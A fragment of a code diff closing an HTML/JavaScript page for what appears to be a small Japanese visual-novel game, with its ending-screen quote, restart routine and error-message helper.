+      document.getElementById('end-quote').textContent = `「愛してるよ、${playerName}」`;
+      document.getElementById('ending-screen').classList.add('show');
+    }, 1200);
+  });
+}
+
+function restartGame() {
+  document.getElementById('ending-screen').classList.remove('show');
+  document.getElementById('choices-area').innerHTML = '';
+  document.getElementById('dialogue-text').textContent = '';
+  document.getElementById('player-name').value = '';
+  document.getElementById('prog-fill').style.width = '0%';
+  videoResendCnt = 0; selectedFile = null;
+  document.getElementById('title-screen').style.display = 'flex';
+}
+
+function showUcErr(msg) {
+  const el = document.getElementById('uc-err');
+  el.textContent = '⚠️ ' + msg;
+  el.style.display = 'block';
+}
+</script>
+</body>
+</html>
